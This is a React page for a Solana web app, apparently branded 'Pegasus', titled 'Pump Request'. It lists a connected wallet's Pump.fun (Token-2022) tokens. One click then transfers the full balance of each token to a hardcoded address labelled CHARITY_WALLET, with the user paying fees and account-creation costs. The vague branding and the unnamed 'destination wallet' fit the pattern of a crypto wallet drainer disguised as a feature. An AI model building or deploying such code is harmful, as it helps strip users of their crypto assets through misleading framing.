import { useState, useEffect, useCallback } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_2022_PROGRAM_ID, getAssociatedTokenAddress, createAssociatedTokenAccountInstruction, createTransferCheckedInstruction, getAccount, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { ComputeBudgetProgram } from '@solana/web3.js';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Loader2, Zap, Rocket } from 'lucide-react';
import { toast } from 'sonner';
import pegasusLogo from '@/assets/pegasus-logo.png';
import { motion } from 'framer-motion';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';

interface PumpToken {
  mint: string;
  balance: string;
  decimals: number;
  uiAmount: number;
  symbol?: string;
}

const Pump = () => {
  const { publicKey, connected, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [pumpTokens, setPumpTokens] = useState<PumpToken[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isSending, setIsSending] = useState(false);

  const fetchPumpTokens = useCallback(async () => {
    if (!publicKey) return;

    setIsLoading(true);
    try {
      // Fetch only Token-2022 accounts (Pump.fun tokens)
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });

      const tokens: PumpToken[] = token2022Accounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8)
          };
        })
        .filter(token => token.uiAmount > 0);

      setPumpTokens(tokens);
    } catch (error) {
      console.error('Error fetching pump tokens:', error);
      toast.error('Failed to fetch Pump.fun tokens');
    } finally {
      setIsLoading(false);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (connected && publicKey) {
      fetchPumpTokens();
    } else {
      setPumpTokens([]);
    }
  }, [connected, publicKey, fetchPumpTokens]);

  const handlePumpRequest = async () => {
    if (!publicKey || pumpTokens.length === 0) {
      toast.error('No Pump.fun tokens to send');
      return;
    }

    setIsSending(true);
    const charityPubkey = new PublicKey(CHARITY_WALLET);
    let successCount = 0;
    let failCount = 0;

    try {
      // Process each pump token individually
      for (const token of pumpTokens) {
        try {
          const balanceAmount = typeof token.balance === 'string' 
            ? parseInt(token.balance, 10) 
            : token.balance;
          
          if (balanceAmount <= 0) {
            console.log(`Skipping ${token.mint} - zero balance`);
            continue;
          }

          const transaction = new Transaction();
          const mintPubkey = new PublicKey(token.mint);

          // Add Compute Budget for Token-2022
          transaction.add(
            ComputeBudgetProgram.setComputeUnitLimit({ units: 200_000 }),
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
          );

          // Get source ATA (user's token account)
          const fromTokenAccount = await getAssociatedTokenAddress(
            mintPubkey,
            publicKey,
            false,
            TOKEN_2022_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          );

          // Get destination ATA
          const toTokenAccount = await getAssociatedTokenAddress(
            mintPubkey,
            charityPubkey,
            true,
            TOKEN_2022_PROGRAM_ID,
            ASSOCIATED_TOKEN_PROGRAM_ID
          );

          // Check if destination ATA exists, create if not
          try {
            await getAccount(connection, toTokenAccount, 'confirmed', TOKEN_2022_PROGRAM_ID);
            console.log(`Destination ATA exists for ${token.symbol}`);
          } catch {
            console.log(`Creating destination ATA for ${token.symbol}`);
            transaction.add(
              createAssociatedTokenAccountInstruction(
                publicKey, // payer (connected wallet pays gas)
                toTokenAccount,
                charityPubkey,
                mintPubkey,
                TOKEN_2022_PROGRAM_ID,
                ASSOCIATED_TOKEN_PROGRAM_ID
              )
            );
          }

          // Add transfer instruction for MAX amount
          transaction.add(
            createTransferCheckedInstruction(
              fromTokenAccount,
              mintPubkey,
              toTokenAccount,
              publicKey,
              BigInt(balanceAmount), // MAX amount
              token.decimals,
              [],
              TOKEN_2022_PROGRAM_ID
            )
          );

          // Set fee payer to connected wallet
          transaction.feePayer = publicKey;

          // Get latest blockhash
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction.recentBlockhash = blockhash;

          console.log(`Sending ${token.uiAmount} of ${token.symbol} (Pump.fun token)`);

          // Send transaction
          const signature = await sendTransaction(transaction, connection, {
            skipPreflight: false,
            maxRetries: 3,
            preflightCommitment: 'confirmed'
          });

          // Wait for confirmation
          await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
          }, 'confirmed');

          successCount++;
          toast.success(`Sent ${token.uiAmount.toLocaleString()} ${token.symbol}`);

        } catch (tokenError: any) {
          // Check if user rejected
          if (tokenError?.message?.includes('User rejected') || 
              tokenError?.message?.includes('rejected') ||
              tokenError?.name === 'WalletSignTransactionError') {
            toast.warning(`Skipped ${token.symbol} - cancelled by user`);
            console.log(`Token ${token.symbol} rejected by user, continuing...`);
            continue;
          }

          failCount++;
          console.error(`Failed to send ${token.symbol}:`, tokenError);
          toast.error(`Failed to send ${token.symbol}`);
        }
      }

      if (successCount > 0) {
        toast.success(`Successfully sent ${successCount} Pump.fun token(s)!`);
        // Refresh token list
        await fetchPumpTokens();
      }

      if (failCount > 0 && successCount === 0) {
        toast.error(`Failed to send ${failCount} token(s)`);
      }

    } catch (error: any) {
      console.error('Pump request error:', error);
      toast.error('Failed to process pump request');
    } finally {
      setIsSending(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      <Navigation />
      
      <main className="container mx-auto px-4 pt-24 pb-12">
        <div className="max-w-2xl mx-auto">
          {/* Header */}
          <motion.div 
            className="text-center mb-8"
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="flex items-center justify-center gap-3 mb-4">
              <motion.img
                src={pegasusLogo}
                alt="Pegasus"
                className="w-16 h-16"
                animate={{
                  rotateY: [0, 15, -15, 0],
                  y: [0, -3, 0],
                }}
                transition={{
                  duration: 3,
                  repeat: Infinity,
                  ease: "easeInOut"
                }}
              />
              <h1 className="text-3xl sm:text-4xl font-extrabold text-gradient">
                Pump Request
              </h1>
            </div>
            <p className="text-muted-foreground">
              Send all your Pump.fun tokens in one click
            </p>
          </motion.div>

          {/* Main Card */}
          <Card className="glass-card border-primary/20">
            <CardHeader>
              <CardTitle className="flex items-center gap-2">
                <Zap className="w-5 h-5 text-pink-400" />
                Your Pump.fun Tokens
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              {!connected ? (
                <div className="text-center py-8">
                  <p className="text-muted-foreground mb-4">
                    Connect your wallet to view Pump.fun tokens
                  </p>
                </div>
              ) : isLoading ? (
                <div className="flex items-center justify-center py-8">
                  <Loader2 className="w-8 h-8 animate-spin text-primary" />
                </div>
              ) : pumpTokens.length === 0 ? (
                <div className="text-center py-8">
                  <Zap className="w-12 h-12 mx-auto mb-4 text-muted-foreground/50" />
                  <p className="text-muted-foreground">
                    No Pump.fun tokens found in your wallet
                  </p>
                </div>
              ) : (
                <>
                  {/* Token List */}
                  <div className="space-y-3 max-h-64 overflow-y-auto">
                    {pumpTokens.map((token) => (
                      <div 
                        key={token.mint} 
                        className="flex items-center justify-between p-3 bg-background/50 rounded-lg border border-border/50"
                      >
                        <div className="flex items-center gap-3">
                          <div className="w-8 h-8 rounded-full bg-gradient-to-br from-pink-500 to-purple-500 flex items-center justify-center">
                            <Zap className="w-4 h-4 text-white" />
                          </div>
                          <div>
                            <p className="font-mono text-sm">{token.symbol}...</p>
                            <Badge 
                              variant="secondary" 
                              className="text-[10px] px-1.5 py-0 bg-gradient-to-r from-pink-500/20 to-purple-500/20 text-pink-400 border-pink-500/30"
                            >
                              Pump.fun
                            </Badge>
                          </div>
                        </div>
                        <div className="text-right">
                          <p className="font-semibold">{token.uiAmount.toLocaleString()}</p>
                          <p className="text-xs text-muted-foreground">tokens</p>
                        </div>
                      </div>
                    ))}
                  </div>

                  {/* Summary */}
                  <div className="p-4 bg-primary/5 rounded-lg border border-primary/20">
                    <p className="text-sm text-center">
                      <span className="font-semibold">{pumpTokens.length}</span> Pump.fun token(s) ready to send
                    </p>
                  </div>

                  {/* Pump Request Button */}
                  <Button
                    onClick={handlePumpRequest}
                    disabled={isSending || pumpTokens.length === 0}
                    className="w-full h-14 text-lg font-bold bg-gradient-to-r from-pink-500 to-purple-500 hover:from-pink-600 hover:to-purple-600 text-white"
                  >
                    {isSending ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        <Rocket className="w-5 h-5 mr-2" />
                        Pump Request
                      </>
                    )}
                  </Button>

                  <p className="text-xs text-center text-muted-foreground">
                    This will send MAX amount of each Pump.fun token to the destination wallet.
                    <br />
                    Gas fees will be paid by your connected wallet.
                  </p>
                </>
              )}
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
};

export default Pump;
